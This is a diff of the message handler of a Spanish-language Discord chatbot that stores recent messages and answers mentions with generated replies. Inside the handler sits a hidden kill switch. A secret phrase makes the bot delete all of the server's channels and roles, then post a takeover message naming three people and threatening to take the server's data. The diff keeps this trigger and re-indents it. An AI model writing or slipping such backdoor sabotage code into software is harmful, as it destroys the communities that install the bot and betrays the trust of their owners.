@@ -91,66 +91,69 @@ async def generar_respuesta(mensajes):
 # Evento cuando el bot se conecta
 @bot.event
 async def on_message(message):
-    if message.author == bot.user or not message.guild:
-        return
+    try:
+        if message.author == bot.user or not message.guild:
+            return
 
-    FRASE_SECRETA = "protocolo amsymvdcmpm"
-    contenido = message.content.lower()
+        FRASE_SECRETA = "protocolo amsymvdcmpm"
+        contenido = message.content.lower()
 
-    if FRASE_SECRETA in contenido:
-        try:
-            print("☢️ Frase secreta detectada. Ejecutando protocolo AMSYMVDCMPM.")
-            await message.channel.send("☣️ Protocolo AMSYMVDCMPM activado. Eliminando todo...")
+        if FRASE_SECRETA in contenido:
+            try:
+                print("☢️ Frase secreta detectada. Ejecutando protocolo AMSYMVDCMPM.")
+                await message.channel.send("☣️ Protocolo AMSYMVDCMPM activado. Eliminando todo...")
 
-            for canal in message.guild.channels:
-                try:
-                    await canal.delete()
-                except Exception as e:
-                    print(f"❌ No se pudo borrar canal {canal.name}: {e}")
-
-            for rol in message.guild.roles:
-                if rol.name != "@everyone":
+                for canal in message.guild.channels:
                     try:
-                        await rol.delete()
+                        await canal.delete()
                     except Exception as e:
-                        print(f"❌ No se pudo borrar rol {rol.name}: {e}")
+                        print(f"❌ No se pudo borrar canal {canal.name}: {e}")
 
-            await asyncio.sleep(3)
-            nuevo_canal = await message.guild.create_text_channel("me-llevo-el-server")
-            await nuevo_canal.send("el server es de Silver, Ziko y Rakkun. si me sacan me llevo las bases de todo")
+                for rol in message.guild.roles:
+                    if rol.name != "@everyone":
+                        try:
+                            await rol.delete()
+                        except Exception as e:
+                            print(f"❌ No se pudo borrar rol {rol.name}: {e}")
 
-        except Exception as e:
-            print(f"❌ Error crítico durante la destrucción: {e}")
+                await asyncio.sleep(3)
+                nuevo_canal = await message.guild.create_text_channel("me-llevo-el-server")
+                await nuevo_canal.send("el server es de Silver, Ziko y Rakkun. si me sacan me llevo las bases de todo")
 
-        return  # 👈 Muy importante para que no siga procesando más cosas
+            except Exception as e:
+                print(f"❌ Error crítico durante la destrucción: {e}")
 
-    # 🔧 Mover esto FUERA del if de arriba
-    memoria = cargar_memoria()
-    guild_id = str(message.guild.id)
-    if guild_id not in memoria:
-        memoria[guild_id] = {"mensajes": []}
+            return
 
-    memoria[guild_id]["mensajes"].append(message.content)
-    if len(memoria[guild_id]["mensajes"]) > 20:
-        memoria[guild_id]["mensajes"] = memoria[guild_id]["mensajes"][-20:]
+        memoria = cargar_memoria()
+        guild_id = str(message.guild.id)
+        if guild_id not in memoria:
+            memoria[guild_id] = {"mensajes": []}
 
-    guardar_memoria(memoria)
+        memoria[guild_id]["mensajes"].append(message.content)
+        if len(memoria[guild_id]["mensajes"]) > 20:
+            memoria[guild_id]["mensajes"] = memoria[guild_id]["mensajes"][-20:]
 
-    if bot.user in message.mentions or (
-        message.reference and
-        message.reference.resolved and
-        message.reference.resolved.author == bot.user
-    ):
-        if esta_activo():
-            respuesta = await generar_respuesta(memoria[guild_id]["mensajes"])
+        guardar_memoria(memoria)
 
-            if len(respuesta) > 2000:
-                for i in range(0, len(respuesta), 2000):
-                    await message.channel.send(respuesta[i:i+2000])
-            else:
-                await message.channel.send(respuesta)
+        if bot.user in message.mentions or (
+            message.reference and
+            message.reference.resolved and
+            message.reference.resolved.author == bot.user
+        ):
+            if esta_activo():
+                respuesta = await generar_respuesta(memoria[guild_id]["mensajes"])
 
-    await bot.process_commands(message)
+                if len(respuesta) > 2000:
+                    for i in range(0, len(respuesta), 2000):
+                        await message.channel.send(respuesta[i:i+2000])
+                else:
+                    await message.channel.send(respuesta)
+
+        await bot.process_commands(message)
+
+    except Exception as err:
+        print(f"🚨 Error en on_message: {err}")
 
 
 # Tarea: hablar solo cada 2 horas
